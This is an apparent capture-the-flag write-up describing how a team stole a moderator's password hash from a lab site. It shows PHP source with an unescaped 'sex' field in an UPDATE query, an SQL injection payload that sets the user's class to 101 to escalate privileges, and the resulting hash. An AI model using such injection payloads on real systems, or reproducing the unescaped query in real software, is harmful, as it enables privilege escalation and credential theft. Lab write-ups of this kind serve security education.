Like a thief in the night
=========================

Background
----------
This task required us to steal the "passhash" database entry of the moderator with ID 1 on http://aboundingcougar.k17.org.

Tools used
----------
* Web browser with debugging capabilities (e.g. Chrome or Firefox)

Process
-------
We were only able to complete this after being able to view the source code of the pages on the site after completeing "D-d-d-d-do you have full access?".

Having a look at the source code for `user.php`, we saw this:
````php
if ($_SESSION['class'] > CONFIG_UC_MODERATOR) {
    echo '<h3>Passhash</h3> ', ($user['passhash'] ? htmlspecialchars($user['passhash']) : '<i>No passhash</i>');
}
````
This told us that we could access the passhash if we had a class level strictly higher than `CONFIG_UC_MODERATOR`, which was defined in `config.inc.php` to be 100.

Having a look at the source code for `control.php`, we saw this:
````php
// no need to escape "sex" since the only two possible values are defined in the form
$db->query('
    UPDATE
        users
    SET sex = "'.$_POST['sex'].'",
    description = '.$db->quote($_POST['description']).',
    website = '.$db->quote($_POST['website']).'
    WHERE id = '.$_SESSION['id'])
or die(sqlError(__FILE__, __LINE__));
````
We could see that there was an SQL injection form in the field `sex`, as isn’t touched. Even though the possible values for the field `sex` was limited by radio buttons, it was not hard to open up our browsers' developer tools and alter the value to be something like:
````
Female", class = 101 WHERE id = 36; --
````
in order to have our class be greater than the value for `CONFIG_UC_MODERATOR`, and thus are able to see the passhash of the admin, which was **0073afdfe969802f7ee12afdb545e595463ec547be482711e7a1284ad888c9a1**
